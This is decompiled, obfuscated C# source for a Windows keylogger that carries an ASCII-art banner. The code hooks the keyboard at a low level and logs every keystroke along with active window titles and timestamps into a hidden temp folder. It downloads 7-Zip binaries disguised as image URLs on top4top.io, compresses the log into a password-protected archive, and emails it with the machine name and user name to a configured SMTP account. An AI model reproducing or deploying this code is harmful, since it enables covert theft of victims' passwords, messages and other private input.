using System;
using System.Diagnostics;
using System.Globalization;
using System.IO;
using System.Net;
using System.Net.Mail;
using System.Reflection;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading;
using System.Windows.Forms;
using Client.My;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using Microsoft.VisualBasic.Devices;
using ns15;
using ns21;

namespace ns9;

public class GClass9
{
	private struct KBDLLHOOKSTRUCT
	{
		public uint vkCode;

		public uint scanCode;

		public KBDLLHOOKSTRUCTFlags flags;

		public uint time;

		public UIntPtr dwExtraInfo;
	}

	[Flags]
	private enum KBDLLHOOKSTRUCTFlags : uint
	{
		LLKHF_EXTENDED = 1u,
		LLKHF_INJECTED = 0x10u,
		LLKHF_ALTDOWN = 0x20u,
		LLKHF_UP = 0x80u
	}

	public delegate int KBDLLHookProc(int nCode, IntPtr wParam, IntPtr lParam);

	public static string string_0 = Path.GetTempPath();

	public static string string_1 = Conversions.ToString(2);

	public static string string_2 = GClass20.string_44;

	public static string string_3 = GClass20.string_43;

	public static string string_4 = GClass20.string_46;

	public static int int_0 = GClass20.int_3;

	public static bool bool_0 = GClass20.bool_19;

	public static object object_0 = GClass20.string_45;

	public static int int_1 = GClass20.int_4 * 512;

	public static string string_5 = "Name Machine: " + Environment.MachineName;

	public static string string_6 = "UserID: " + GClass14.smethod_5();

	public static string string_7 = "UserName: " + Environment.UserName;

	public static string string_8 = GClass20.string_47;

	public static object object_1 = string_5 + "\n" + string_6 + "\n" + string_7 + "\n" + string_8;

	public static string string_9 = GClass20.string_49;

	public static string string_10 = GClass20.string_50;

	public static string string_11 = "";

	public static bool bool_1 = false;

	public static StreamWriter streamWriter_0;

	public static string string_12 = string_0 + GClass14.smethod_5() + "\\";

	public static string string_13 = "temp.bin";

	public static object object_2 = Environment.UserName + ".log";

	public static string string_14 = "logs.zip";

	public static object object_3 = GClass20.string_48;

	public static string string_15 = CultureInfo.CurrentCulture.ToString();

	public static object object_4 = "\r\n    ███╗░░░███╗██╗░░░██╗██████╗░██████╗░░█████╗░░░███╗░░███╗░░██╗\r\n    ████╗░████║██║░░░██║██╔══██╗██╔══██╗██╔══██╗░████║░░████╗░██║\r\n    ██╔████╔██║██║░░░██║██████╔╝██████╔╝███████║██╔██║░░██╔██╗██║\r\n    ██║╚██╔╝██║██║░░░██║██╔══██╗██╔══██╗██╔══██║╚═╝██║░░██║╚████║\r\n    ██║░╚═╝░██║╚██████╔╝██║░░██║██║░░██║██║░░██║███████╗██║░╚███║\r\n    ╚═╝░░░░░╚═╝░╚═════╝░╚═╝░░╚═╝╚═╝░░╚═╝╚═╝░░╚═╝╚══════╝╚═╝░░╚══╝";

	public static string string_16 = "\r\n" + string_7 + "\r\n" + string_5 + "\r\nLanguage: " + string_15 + "\r\n";

	private static bool bool_2 = false;

	private static bool[] bool_3 = new bool[256];

	private static int int_2;

	private static string string_17;

	private static Keys keys_0 = (Keys)0;

	private const int int_3 = 13;

	private const int int_4 = 0;

	private const int int_5 = 260;

	private const int int_6 = 261;

	private static KBDLLHookProc kbdllhookProc_0 = smethod_10;

	private static IntPtr intptr_0 = IntPtr.Zero;

	private const int int_7 = 256;

	private const int int_8 = 257;

	[MethodImpl(MethodImplOptions.NoOptimization)]
	public static void smethod_0()
	{
		try
		{
			if (!Directory.Exists(string_12))
			{
				Directory.CreateDirectory(string_12);
				FileSystem.SetAttr(string_12, (FileAttribute)Conversions.ToInteger(string_1));
			}
			if (bool_1)
			{
				return;
			}
			using (StreamWriter streamWriter = File.CreateText(string_12 + string_13))
			{
				streamWriter.WriteLine(RuntimeHelpers.GetObjectValue(object_4));
				streamWriter.WriteLine(string_16);
				streamWriter.WriteLine("Report:");
			}
			smethod_5();
			string_11 = File.ReadAllText(string_12 + string_13);
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
		streamWriter_0 = File.AppendText(string_12 + string_13);
		streamWriter_0.AutoFlush = true;
		intptr_0 = (IntPtr)SetWindowsHookEx(13, kbdllhookProc_0, (IntPtr)Marshal.GetHINSTANCE(Assembly.GetExecutingAssembly().GetModules()[0]).ToInt32(), 0);
		Thread thread = new Thread(smethod_2, 1);
		thread.Start();
	}

	public static void smethod_1(bool bool_4)
	{
		bool_2 = true;
		while (bool_1)
		{
			Thread.Sleep(1);
		}
		if (bool_4)
		{
			Thread.Sleep(1000);
			try
			{
				streamWriter_0.Close();
				streamWriter_0.Dispose();
				File.Delete(string_12);
			}
			catch (Exception projectError)
			{
				ProjectData.SetProjectError(projectError);
				ProjectData.ClearProjectError();
			}
			string_11 = "";
		}
		bool_2 = false;
	}

	private static void smethod_2()
	{
		//IL_0049: Unknown result type (might be due to invalid IL or missing references)
		bool_1 = true;
		try
		{
			while (!bool_2)
			{
				Thread.Sleep(1);
				int num = bool_3.Length - 1;
				for (int i = 0; i <= num; i++)
				{
					if (!bool_3[i])
					{
						continue;
					}
					bool_3[i] = false;
					string text = smethod_8() + smethod_6((Keys)i);
					keys_0 = (Keys)i;
					string_11 += text;
					streamWriter_0.Write(text);
					if (string_11.Length > int_1)
					{
						streamWriter_0.Close();
						streamWriter_0.Dispose();
						smethod_4();
						smethod_3();
						Thread.Sleep(1000);
						File.Delete(Conversions.ToString(Operators.ConcatenateObject((object)string_12, object_2)));
						File.Delete(string_12 + string_14);
						string_11 = string_11.Remove(0);
						using (StreamWriter streamWriter = File.CreateText(string_12 + string_13))
						{
							streamWriter.WriteLine(RuntimeHelpers.GetObjectValue(object_4));
							streamWriter.WriteLine(string_16);
							streamWriter.WriteLine("Report:");
							streamWriter.WriteLine(text);
							streamWriter.WriteLine(string_11);
							streamWriter.WriteLine("\r\n");
						}
						streamWriter_0 = File.AppendText(string_12 + string_13);
						streamWriter_0.AutoFlush = true;
						File.Delete(string_12 + string_14);
					}
				}
			}
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
		try
		{
			streamWriter_0.Close();
		}
		catch (Exception projectError2)
		{
			ProjectData.SetProjectError(projectError2);
			ProjectData.ClearProjectError();
		}
		try
		{
			streamWriter_0.Dispose();
		}
		catch (Exception projectError3)
		{
			ProjectData.SetProjectError(projectError3);
			ProjectData.ClearProjectError();
		}
		bool_1 = false;
	}

	public static object smethod_3()
	{
		object result = default(object);
		try
		{
			using Attachment item = new Attachment(string_12 + string_14);
			using MailMessage mailMessage = new MailMessage
			{
				Subject = string_4
			};
			mailMessage.To.Add(string_3);
			mailMessage.From = new MailAddress(string_3);
			mailMessage.Body = Conversions.ToString(object_1);
			mailMessage.Attachments.Add(item);
			SmtpClient smtpClient = new SmtpClient(Conversions.ToString(object_0));
			smtpClient.EnableSsl = bool_0;
			smtpClient.Credentials = new NetworkCredential(string_3, string_2);
			smtpClient.Port = int_0;
			using SmtpClient smtpClient2 = smtpClient;
			smtpClient2.Send(mailMessage);
			return result;
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
			return result;
		}
	}

	public static object smethod_4()
	{
		object result = default(object);
		try
		{
			File.Copy(string_12 + string_13, Conversions.ToString(Operators.ConcatenateObject((object)string_12, object_2)), overwrite: true);
			Interaction.Shell(Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject((object)("cmd /c " + string_12 + "7z.exe a " + string_12 + string_14 + " " + string_12), object_2), (object)" -p"), object_3), (object)" -sdel -mx7")), (AppWinStyle)0, true, -1);
			return result;
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
			return result;
		}
	}

	public static void smethod_5()
	{
		try
		{
			Uri uri = new Uri("https://i.top4top.io/p_1880ybw6x1.jpg");
			Uri uri2 = new Uri("https://e.top4top.io/p_1888159ws1.jpeg");
			if (!File.Exists(string_12 + "7z.exe"))
			{
				if (Operators.CompareString(string_9, "", false) == 0)
				{
					((ServerComputer)MyProject.Computer).get_Network().DownloadFile(uri, string_12 + "7z.exe");
				}
				else
				{
					((ServerComputer)MyProject.Computer).get_Network().DownloadFile(string_9, string_12 + "7z.exe");
				}
			}
			if (!File.Exists(string_12 + "7z.dll"))
			{
				if (Operators.CompareString(string_10, "", false) == 0)
				{
					((ServerComputer)MyProject.Computer).get_Network().DownloadFile(uri2, string_12 + "7z.dll");
				}
				else
				{
					((ServerComputer)MyProject.Computer).get_Network().DownloadFile(string_10, string_12 + "7z.dll");
				}
			}
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}

	[DllImport("user32.dll")]
	private static extern int ToUnicodeEx(uint uint_0, uint uint_1, byte[] byte_0, [Out][MarshalAs(UnmanagedType.LPWStr)] StringBuilder stringBuilder_0, int int_9, uint uint_2, IntPtr intptr_1);

	[DllImport("user32.dll")]
	private static extern bool GetKeyboardState(byte[] byte_0);

	[DllImport("user32.dll")]
	private static extern uint MapVirtualKey(uint uint_0, uint uint_1);

	[DllImport("User32.dll", CallingConvention = CallingConvention.StdCall, CharSet = CharSet.Auto)]
	private static extern int SetWindowsHookEx(int int_9, KBDLLHookProc kbdllhookProc_1, IntPtr intptr_1, int int_10);

	[DllImport("User32.dll", CallingConvention = CallingConvention.StdCall, CharSet = CharSet.Auto)]
	private static extern int CallNextHookEx(int int_9, int int_10, IntPtr intptr_1, IntPtr intptr_2);

	[DllImport("User32.dll", CallingConvention = CallingConvention.StdCall, CharSet = CharSet.Auto)]
	private static extern bool UnhookWindowsHookEx(int int_9);

	[DllImport("user32.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	private static extern int GetWindowThreadProcessId(IntPtr intptr_1, ref int int_9);

	[DllImport("user32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	private static extern int GetKeyboardLayout(int int_9);

	[DllImport("user32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	private static extern IntPtr GetForegroundWindow();

	private static string smethod_6(Keys keys_1)
	{
		//IL_002b: Unknown result type (might be due to invalid IL or missing references)
		//IL_002c: Unknown result type (might be due to invalid IL or missing references)
		//IL_002e: Unknown result type (might be due to invalid IL or missing references)
		//IL_0032: Invalid comparison between Unknown and I4
		//IL_0037: Unknown result type (might be due to invalid IL or missing references)
		//IL_003b: Invalid comparison between Unknown and I4
		//IL_003d: Unknown result type (might be due to invalid IL or missing references)
		//IL_0040: Invalid comparison between Unknown and I4
		//IL_0045: Unknown result type (might be due to invalid IL or missing references)
		//IL_0049: Invalid comparison between Unknown and I4
		//IL_004b: Unknown result type (might be due to invalid IL or missing references)
		//IL_004f: Invalid comparison between Unknown and I4
		//IL_0056: Unknown result type (might be due to invalid IL or missing references)
		//IL_005b: Unknown result type (might be due to invalid IL or missing references)
		//IL_0076: Unknown result type (might be due to invalid IL or missing references)
		//IL_007b: Unknown result type (might be due to invalid IL or missing references)
		//IL_0096: Unknown result type (might be due to invalid IL or missing references)
		//IL_009a: Unknown result type (might be due to invalid IL or missing references)
		//IL_009c: Invalid comparison between Unknown and I4
		//IL_00a1: Unknown result type (might be due to invalid IL or missing references)
		//IL_00a5: Invalid comparison between Unknown and I4
		//IL_00a7: Unknown result type (might be due to invalid IL or missing references)
		//IL_00ab: Invalid comparison between Unknown and I4
		//IL_00ba: Unknown result type (might be due to invalid IL or missing references)
		//IL_00c1: Invalid comparison between Unknown and I4
		//IL_00c3: Unknown result type (might be due to invalid IL or missing references)
		//IL_00c7: Invalid comparison between Unknown and I4
		//IL_00c9: Unknown result type (might be due to invalid IL or missing references)
		//IL_00cd: Unknown result type (might be due to invalid IL or missing references)
		//IL_00d0: Invalid comparison between Unknown and I4
		//IL_00d2: Unknown result type (might be due to invalid IL or missing references)
		//IL_00d9: Unknown result type (might be due to invalid IL or missing references)
		//IL_00db: Invalid comparison between Unknown and I4
		//IL_0101: Unknown result type (might be due to invalid IL or missing references)
		//IL_0108: Invalid comparison between Unknown and I4
		//IL_010a: Unknown result type (might be due to invalid IL or missing references)
		//IL_0111: Invalid comparison between Unknown and I4
		//IL_0113: Unknown result type (might be due to invalid IL or missing references)
		//IL_011a: Invalid comparison between Unknown and I4
		//IL_011f: Unknown result type (might be due to invalid IL or missing references)
		//IL_0125: Expected I4, but got Unknown
		//IL_012d: Unknown result type (might be due to invalid IL or missing references)
		//IL_0133: Expected I4, but got Unknown
		//IL_015f: Unknown result type (might be due to invalid IL or missing references)
		//IL_0165: Expected I4, but got Unknown
		//IL_017b: Unknown result type (might be due to invalid IL or missing references)
		//IL_0181: Expected I4, but got Unknown
		bool flag = ((Computer)MyProject.Computer).get_Keyboard().get_ShiftKeyDown();
		if (((Computer)MyProject.Computer).get_Keyboard().get_CapsLock())
		{
			flag = ((!flag) ? true : false);
		}
		try
		{
			Keys val = keys_1;
			if ((int)val <= 35)
			{
				if ((int)val <= 13)
				{
					if ((int)val == 8)
					{
						goto IL_00df;
					}
					if ((int)val == 9)
					{
						if (keys_0 == keys_1)
						{
							return "";
						}
						return "  [TAP]  \r\n";
					}
					if ((int)val == 13)
					{
						if (keys_0 == keys_1)
						{
							return "";
						}
						return "  [ENTER]  \r\n";
					}
				}
				else
				{
					if (val - 16 <= 1)
					{
						goto IL_0136;
					}
					if ((int)val == 32)
					{
						return "  [Space]  ";
					}
					if ((int)val == 35)
					{
						goto IL_00df;
					}
				}
				goto IL_011c;
			}
			if ((int)val <= 163)
			{
				if ((int)val == 46 || val - 112 <= 11)
				{
					goto IL_00df;
				}
				if (val - 160 > 3)
				{
					goto IL_011c;
				}
			}
			else if ((int)val != 65536 && (int)val != 131072 && (int)val != 262144)
			{
				goto IL_011c;
			}
			goto IL_0136;
			IL_0136:
			return "[" + ((Enum)(Keys)(ref keys_1)).ToString() + "]";
			IL_00df:
			return "[" + ((Enum)(Keys)(ref keys_1)).ToString() + "]";
			IL_011c:
			if (flag)
			{
				return smethod_7((uint)(int)keys_1).ToUpper();
			}
			return smethod_7((uint)(int)keys_1);
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			string result;
			if (flag)
			{
				result = Strings.ChrW((int)keys_1).ToString().ToUpper();
				ProjectData.ClearProjectError();
				return result;
			}
			result = Strings.ChrW((int)keys_1).ToString().ToLower();
			ProjectData.ClearProjectError();
			return result;
		}
	}

	private static string smethod_7(uint uint_0)
	{
		//IL_0078: Unknown result type (might be due to invalid IL or missing references)
		try
		{
			StringBuilder stringBuilder = new StringBuilder();
			byte[] byte_ = new byte[255];
			if (!GetKeyboardState(byte_))
			{
				return "";
			}
			uint uint_ = MapVirtualKey(uint_0, 0u);
			IntPtr foregroundWindow = GetForegroundWindow();
			int int_ = 0;
			int windowThreadProcessId = GetWindowThreadProcessId(foregroundWindow, ref int_);
			IntPtr intptr_ = (IntPtr)GetKeyboardLayout(windowThreadProcessId);
			ToUnicodeEx(uint_0, uint_, byte_, stringBuilder, 5, 0u, intptr_);
			return stringBuilder.ToString();
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
		Keys val = (Keys)uint_0;
		return ((Enum)(Keys)(ref val)).ToString();
	}

	private static string smethod_8()
	{
		try
		{
			IntPtr foregroundWindow = GetForegroundWindow();
			int int_ = default(int);
			GetWindowThreadProcessId(foregroundWindow, ref int_);
			Process processById = Process.GetProcessById(int_);
			if ((foregroundWindow.ToInt32() == int_2) & (Operators.CompareString(string_17, processById.MainWindowTitle, false) == 0))
			{
				return "";
			}
			int_2 = foregroundWindow.ToInt32();
			string_17 = processById.MainWindowTitle;
			return string.Concat("\r\n-----------------------------------------------\r\n[Aplication:------------------------" + string_17 + "]\r\n" + smethod_9(), "\r\n");
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			string result = "";
			ProjectData.ClearProjectError();
			return result;
		}
	}

	private static string smethod_9()
	{
		DateTime localTime = ((ServerComputer)MyProject.Computer).get_Clock().get_LocalTime();
		return "[Date:------------------------------" + Conversions.ToString(localTime.Day) + "/" + Conversions.ToString(localTime.Month) + "/" + Conversions.ToString(localTime.Year) + " ]\r\n[Time:------------------------------" + Conversions.ToString(localTime.Hour) + ":" + Conversions.ToString(localTime.Minute) + ":" + Conversions.ToString(localTime.Second) + " ]\r\n-----------------------------------------------\r\n";
	}

	private static int smethod_10(int int_9, IntPtr intptr_1, IntPtr intptr_2)
	{
		//IL_005d: Unknown result type (might be due to invalid IL or missing references)
		//IL_0064: Unknown result type (might be due to invalid IL or missing references)
		//IL_00bc: Unknown result type (might be due to invalid IL or missing references)
		//IL_00c3: Unknown result type (might be due to invalid IL or missing references)
		if (int_9 == 0)
		{
			KBDLLHOOKSTRUCT kBDLLHOOKSTRUCT = default(KBDLLHOOKSTRUCT);
			if (intptr_1 == (IntPtr)256 || intptr_1 == (IntPtr)260)
			{
				object? obj = Marshal.PtrToStructure(intptr_2, kBDLLHOOKSTRUCT.GetType());
				KBDLLHOOKSTRUCT obj2 = ((obj != null) ? ((KBDLLHOOKSTRUCT)obj) : default(KBDLLHOOKSTRUCT));
				Keys val = (Keys)obj2.vkCode;
				bool_3[val] = true;
			}
			else if (intptr_1 == (IntPtr)257 || intptr_1 == (IntPtr)261)
			{
				object? obj3 = Marshal.PtrToStructure(intptr_2, kBDLLHOOKSTRUCT.GetType());
				KBDLLHOOKSTRUCT obj4 = ((obj3 != null) ? ((KBDLLHOOKSTRUCT)obj3) : default(KBDLLHOOKSTRUCT));
				Keys val2 = (Keys)obj4.vkCode;
				bool_3[val2] = false;
			}
		}
		return CallNextHookEx((int)IntPtr.Zero, int_9, intptr_1, intptr_2);
	}
}
